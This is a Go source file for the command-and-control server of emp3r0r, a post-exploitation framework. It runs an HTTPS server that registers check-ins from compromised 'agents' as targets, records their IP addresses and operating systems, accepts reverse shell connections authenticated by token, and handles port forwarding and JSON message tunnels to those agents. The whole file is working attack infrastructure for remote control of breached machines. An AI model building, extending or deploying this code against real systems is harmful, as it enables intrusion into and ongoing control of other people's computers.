package cc

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/posener/h2conn"
)

// StreamHandler allow the http handler to use H2Conn
type StreamHandler struct {
	H2x     *agent.H2Conn // h2conn with context
	Buf     chan []byte   // buffer for receiving data
	Text    string        // temp string
	BufSize int           // buffer size for reverse shell should be 1
}

var (
	// RShellStream reverse shell handler
	RShellStream = &StreamHandler{H2x: nil, BufSize: agent.RShellBufSize, Buf: make(chan []byte)}

	// ProxyStream proxy handler
	ProxyStream = &StreamHandler{H2x: nil, BufSize: agent.ProxyBufSize, Buf: make(chan []byte)}

	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
	PortFwds = make(map[string]*PortFwdSession)
)

// portFwdHandler handles proxy/port forwarding
func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
	var (
		err error
		h2x agent.H2Conn
	)
	sh.H2x = &h2x
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("portFwdHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel

	// save sh
	shCopy := *sh

	// record this connection to port forwarding map
	buf := make([]byte, sh.BufSize)
	_, err = sh.H2x.Conn.Read(buf)

	if err != nil {
		CliPrintError("portFwd connection: handshake failed: %s\n%v", req.RemoteAddr, err)
		return
	}
	buf = bytes.Trim(buf, "\x00")
	origBuf := buf        // in case we need the orignal session-id, for sub-sessions
	isSubSession := false // sub-session is part of a port-mapping, every client connection starts a sub-session (h2conn)
	if strings.Contains(string(buf), "_") {
		isSubSession = true
		idstr := strings.Split(string(buf), "_")[0]
		buf = []byte(idstr)
	}

	sessionID, err := uuid.ParseBytes(buf)
	if err != nil {
		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", buf, req.RemoteAddr, err)
		return
	}
	// check if session ID exists in the map,
	pf, exist := PortFwds[sessionID.String()]
	if !exist {
		CliPrintError("Unknown ID: %s", sessionID.String())
		return
	}
	pf.Sh = make(map[string]*StreamHandler)
	if !isSubSession {
		pf.Sh[sessionID.String()] = &shCopy // cache this connection
		// handshake success
		CliPrintSuccess("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
	} else {
		pf.Sh[string(origBuf)] = &shCopy // cache this connection
		// handshake success
		if strings.HasSuffix(string(origBuf), "-reverse") {
			CliPrintSuccess("Got a portFwd (reverse) connection (%s) from %s", string(origBuf), req.RemoteAddr)
			err = pf.RunReversedPortFwd(&shCopy) // handle this reverse port mapping request
			if err != nil {
				CliPrintError("RunReversedPortFwd: %v", err)
			}
		} else {
			CliPrintInfo("Got a portFwd sub-connection (%s) from %s", string(origBuf), req.RemoteAddr)
		}
	}

	defer func() {
		err = sh.H2x.Conn.Close()
		if err != nil {
			CliPrintError("portFwdHandler failed to close connection: " + err.Error())
		}

		// if this connection is just a sub-connection
		// keep the port-mapping, only close h2conn
		if string(origBuf) != sessionID.String() {
			cancel()
			CliPrintInfo("portFwdHandler: closed connection %s", origBuf)
			return
		}

		// cancel PortFwd context
		pf, exist = PortFwds[sessionID.String()]
		if exist {
			pf.Cancel()
		} else {
			CliPrintWarning("portFwdHandler: cannot find port mapping: %s", sessionID.String())
		}
		// cancel HTTP request context
		cancel()
		CliPrintWarning("portFwdHandler: closed portFwd connection from %s", req.RemoteAddr)
	}()

	for ctx.Err() == nil && pf.Ctx.Err() == nil {
		_, exist = PortFwds[sessionID.String()]
		if !exist {
			CliPrintWarning("Disconnected: portFwdHandler: port mapping not found")
			return
		}

		time.Sleep(200 * time.Millisecond)
	}
}

// rshellHandler handles buffered data
func (sh *StreamHandler) rshellHandler(wrt http.ResponseWriter, req *http.Request) {
	// check if an agent is already connected
	if sh.H2x.Ctx != nil ||
		sh.H2x.Cancel != nil ||
		sh.H2x.Conn != nil {
		CliPrintError("rshellHandler: occupied")
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	var err error
	// use h2conn
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("rshellHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	// agent auth
	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
	buf := make([]byte, sh.BufSize)
	_, err = sh.H2x.Conn.Read(buf)
	buf = bytes.Trim(buf, "\x00")
	agentToken, err := uuid.ParseBytes(buf)
	if err != nil {
		CliPrintError("Invalid rshell token %s: %v", buf, err)
		return
	}
	if agentToken.String() != sh.Text {
		CliPrintError("Invalid rshell token '%s vs %s'", agentToken.String(), sh.Text)
		return
	}
	CliPrintSuccess("Got a reverse shell connection (%s) from %s", sh.Text, req.RemoteAddr)

	defer func() {
		err = sh.H2x.Conn.Close()
		if err != nil {
			CliPrintError("rshellHandler failed to close connection: " + err.Error())
		}
		sh.Text = ""
		sh.H2x.Cancel()
		CliPrintWarning("Closed reverse shell connection from %s", req.RemoteAddr)
	}()

	for {
		data := make([]byte, sh.BufSize)
		_, err = sh.H2x.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: rshellHandler read: %v", err)
			return
		}
		sh.Buf <- data
	}
}

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.FileAPI); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.FileAPI, 0700)
		if err != nil {
			log.Fatal("TLSServer: ", err)
		}
	}

	// File server
	http.Handle("/", http.FileServer(http.Dir("/tmp/emp3r0r/www")))

	// Message-based communication
	http.HandleFunc("/"+tun.CheckInAPI, checkinHandler)
	http.HandleFunc("/"+tun.MsgAPI, msgTunHandler)

	// Stream handlers
	var rshellConn, proxyConn agent.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn
	http.HandleFunc("/"+tun.ReverseShellAPI, RShellStream.rshellHandler)
	http.HandleFunc("/"+tun.ProxyAPI, ProxyStream.portFwdHandler)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", agent.CCPort), "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
	if err != nil {
		log.Println(color.RedString("Start HTTPS server: %v", err))
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	var target agent.SystemInfo
	jsonData, err := ioutil.ReadAll(req.Body)
	defer req.Body.Close()
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	err = json.Unmarshal(jsonData, &target)
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	// set target IP
	target.IP = req.RemoteAddr

	if !agentExists(&target) {
		inx := len(Targets)
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-")[0]
		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s, "+
			"running '%s'\n",
			inx, shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
			target.OS)
	}
}

// msgTunHandler JSON message based tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("msgTunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	defer func() {
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				CliPrintWarning("msgTunHandler: agent [%d]:%s disconnected\n", c.Index, t.Tag)
				break
			}
		}
		err = conn.Close()
		if err != nil {
			CliPrintError("msgTunHandler failed to close connection: " + err.Error())
		}
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg agent.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	for {
		// deal with json data from agent
		err = in.Decode(&msg)
		if err != nil {
			return
		}
		// read hello from agent, set its Conn if needed, and hello back
		// close connection if agent is not responsive
		if msg.Payload == "hello" {
			err = out.Encode(msg)
			if err != nil {
				CliPrintWarning("msgTunHandler cannot send hello to agent [%s]", msg.Tag)
				return
			}
		}

		// process json tundata from agent
		processAgentData(&msg)

		// assign this Conn to a known agent
		agent := GetTargetFromTag(msg.Tag)
		if agent == nil {
			CliPrintWarning("msgTunHandler: agent not recognized")
			return
		}
		Targets[agent].Conn = conn

	}
}
